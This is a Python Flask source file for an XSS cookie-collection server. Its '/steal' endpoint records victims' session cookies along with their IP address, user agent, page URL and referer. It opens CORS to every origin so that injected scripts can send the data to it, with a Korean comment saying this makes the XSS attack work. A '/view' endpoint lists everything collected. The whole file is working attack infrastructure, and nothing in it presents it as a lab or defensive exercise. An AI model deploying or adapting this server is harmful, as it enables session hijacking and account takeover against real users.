# cookie_collector_server.py
from flask import Flask, request, make_response, jsonify
import datetime

app = Flask(__name__)
stolen_data = []

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'cookies': request.args.get('c') or request.form.get('cookies'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'method': request.method,
        'url': request.args.get('url', ''),
        'referer': request.headers.get('Referer', '')
    }
    stolen_data.append(data)
    print(f"[+] Stolen: {data}")
    
    # CORS 허용 (XSS 공격이 작동하도록)
    response = make_response("", 200)
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/view')
def view():
    return jsonify({'stolen_data': stolen_data, 'total': len(stolen_data)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)